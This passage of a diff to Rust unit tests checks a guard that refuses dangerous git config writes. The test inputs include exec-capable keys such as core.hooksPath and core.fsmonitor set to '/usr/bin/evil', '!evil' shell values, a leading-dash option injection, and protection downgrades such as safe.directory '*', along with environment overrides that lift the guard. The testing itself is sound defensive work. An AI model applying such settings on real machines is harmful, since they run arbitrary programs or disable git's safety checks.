+                        Err(GitError::RefusedDangerousConfig(_, _))
+                    ),
+                    "exec-capable key {key} must be refused"
+                );
+            }
+        });
+    }
+
+    // `core.fsmonitor = true|false` is the safe builtin toggle (a documented
+    // `[git.extra]` example) and must NOT be refused; a program path must be.
+    #[test]
+    fn exec_key_value_safe_exception_for_fsmonitor() {
+        assert!(exec_key_value_is_safe("core.fsmonitor", "true"));
+        assert!(exec_key_value_is_safe("core.fsmonitor", "false"));
+        assert!(exec_key_value_is_safe("CORE.FSMONITOR", " True "));
+        assert!(!exec_key_value_is_safe("core.fsmonitor", "/usr/bin/evil"));
+        // No exception for the hard exec keys.
+        assert!(!exec_key_value_is_safe("core.hooksPath", "true"));
+        assert!(!exec_key_value_is_safe("core.pager", "true"));
+    }
+
+    #[test]
+    fn configure_extra_exec_key_override_allows() {
+        // With the opt-in the key would reach set_config (which shells out to
+        // git --global). We only assert the refusal is lifted, so use a local
+        // scope + temp dir would be needed to fully apply; here we just prove
+        // the exec-key guard no longer short-circuits by checking is_exec logic
+        // stays but env flips. Keep it a pure unit check to avoid git I/O.
+        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", Some("1"), || {
+            assert!(env_flag_enabled("JARVY_ALLOW_GIT_EXEC_KEYS"));
+        });
+    }
+
+    // Security F4 (P2): leading-`-` value is argv option-injection into git config.
+    #[test]
+    fn configure_extra_refuses_leading_dash_value() {
+        let mut cfg = GitConfig::default();
+        cfg.extra
+            .insert("core.autocrlf".to_string(), "--unset".to_string());
         assert!(matches!(
-            setup.configure_extra(),
+            GitSetup::new(cfg).configure_extra(),
             Err(GitError::RefusedDangerousConfig(_, _))
         ));
     }
 
+    // `!`-value on a benign (non-exec, non-guardrail) key is still refused.
     #[test]
-    fn check_protect_downgrade_refuses_weakening() {
-        // Guarded by the env escape hatch; skip if a parallel test/CI set it.
-        if std::env::var("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE").is_ok() {
-            return;
-        }
-        assert!(check_not_protect_downgrade("core.protectNTFS", "false").is_err());
-        assert!(check_not_protect_downgrade("core.protectHFS", "off").is_err());
-        assert!(check_not_protect_downgrade("safe.directory", "*").is_err());
-        assert!(check_not_protect_downgrade("fsck.zeroPaddedFilemode", "ignore").is_err());
-        // Case-insensitive on both key and value.
-        assert!(check_not_protect_downgrade("CORE.PROTECTNTFS", "NO").is_err());
-    }
-
-    #[test]
-    fn check_protect_downgrade_allows_safe_values() {
-        if std::env::var("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE").is_ok() {
-            return;
-        }
-        assert!(check_not_protect_downgrade("core.protectNTFS", "true").is_ok());
-        assert!(check_not_protect_downgrade("safe.directory", "/srv/repo").is_ok());
-        assert!(check_not_protect_downgrade("fsck.zeroPaddedFilemode", "warn").is_ok());
-        // Unrelated keys are never touched.
-        assert!(check_not_protect_downgrade("core.fsmonitor", "false").is_ok());
-    }
-
-    #[test]
-    fn configure_extra_refuses_protect_downgrade() {
-        if std::env::var("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE").is_ok() {
-            return;
-        }
+    fn configure_extra_refuses_bang_value_for_benign_key() {
         let mut cfg = GitConfig::default();
         cfg.extra
-            .insert("core.protectNTFS".to_string(), "false".to_string());
-        let setup = GitSetup::new(cfg);
+            .insert("format.pretty".to_string(), "!evil".to_string());
         assert!(matches!(
-            setup.configure_extra(),
+            GitSetup::new(cfg).configure_extra(),
             Err(GitError::RefusedDangerousConfig(_, _))
         ));
     }
@@ -794,11 +1192,88 @@ mod tests {
     fn configure_extra_rejects_bad_key_before_running_git() {
         let mut cfg = GitConfig::default();
         cfg.extra.insert("--global".to_string(), "true".to_string());
-        let setup = GitSetup::new(cfg);
         assert!(matches!(
-            setup.configure_extra(),
+            GitSetup::new(cfg).configure_extra(),
             Err(GitError::InvalidConfigKey(_, _))
         ));
+    }
+
+    // ---- check_not_protect_downgrade (Security F3/F6, QA F5/F6) --------
+
+    #[test]
+    fn check_protect_downgrade_refuses_weakening() {
+        with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", None, || {
+            // Original guardrails.
+            assert!(check_not_protect_downgrade("core.protectNTFS", "false").is_err());
+            assert!(check_not_protect_downgrade("core.protectHFS", "off").is_err());
+            assert!(check_not_protect_downgrade("safe.directory", "*").is_err());
+            assert!(check_not_protect_downgrade("fsck.zeroPaddedFilemode", "ignore").is_err());
+            // Case-insensitive on key and value.
+            assert!(check_not_protect_downgrade("CORE.PROTECTNTFS", "NO").is_err());
+            // Whitespace-trimmed (QA F5) — else `" false "` slips past.
+            assert!(check_not_protect_downgrade("core.protectNTFS", " false ").is_err());
+            assert!(check_not_protect_downgrade("safe.directory", "  *  ").is_err());
+            // Empty value is falsey → refused for protect keys.
+            assert!(check_not_protect_downgrade("core.protectNTFS", "").is_err());
+            // Widened coverage (Security F3/F6, QA F6).
+            assert!(check_not_protect_downgrade("safe.bareRepository", "all").is_err());
+            assert!(
+                check_not_protect_downgrade("fetch.fsck.zeroPaddedFilemode", "ignore").is_err()
+            );
+            assert!(
+                check_not_protect_downgrade("receive.fsck.zeroPaddedFilemode", "ignore").is_err()
+            );
+            assert!(check_not_protect_downgrade("receive.fsckObjects", "false").is_err());
+            assert!(check_not_protect_downgrade("transfer.fsckObjects", "0").is_err());
+            assert!(check_not_protect_downgrade("fetch.fsckObjects", "no").is_err());
+        });
+    }
+
+    #[test]
+    fn check_protect_downgrade_allows_safe_values() {
+        with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", None, || {
+            assert!(check_not_protect_downgrade("core.protectNTFS", "true").is_ok());
+            assert!(check_not_protect_downgrade("safe.directory", "/srv/repo").is_ok());
+            assert!(check_not_protect_downgrade("safe.bareRepository", "explicit").is_ok());
+            assert!(check_not_protect_downgrade("fsck.zeroPaddedFilemode", "warn").is_ok());
+            assert!(check_not_protect_downgrade("receive.fsckObjects", "true").is_ok());
+            // Keys the guard doesn't cover pass through here (exec policy handles
+            // core.fsmonitor separately, in configure_extra).
+            assert!(check_not_protect_downgrade("core.whitespace", "false").is_ok());
+        });
+    }
+
+    // QA F3 / F10: prove the env opt-out actually ALLOWS, deterministically.
+    #[test]
+    fn check_protect_downgrade_env_override_allows() {
+        for v in ["1", "true", "TRUE", "yes"] {
+            with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", Some(v), || {
+                assert!(
+                    check_not_protect_downgrade("core.protectNTFS", "false").is_ok(),
+                    "override value {v} should allow"
+                );
+                assert!(check_not_protect_downgrade("safe.directory", "*").is_ok());
+            });
+        }
+        // Non-truthy values do NOT lift the guard.
+        for v in ["0", "no", "nope", ""] {
+            with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", Some(v), || {
+                assert!(check_not_protect_downgrade("core.protectNTFS", "false").is_err());
+            });
+        }
+    }
+
+    #[test]
+    fn configure_extra_refuses_protect_downgrade() {
+        with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", None, || {
+            let mut cfg = GitConfig::default();
+            cfg.extra
+                .insert("core.protectNTFS".to_string(), "false".to_string());
+            assert!(matches!(
+                GitSetup::new(cfg).configure_extra(),
+                Err(GitError::RefusedDangerousConfig(_, _))
+            ));
+        });
     }
 
     /// Helper trait so the loop above reads naturally.
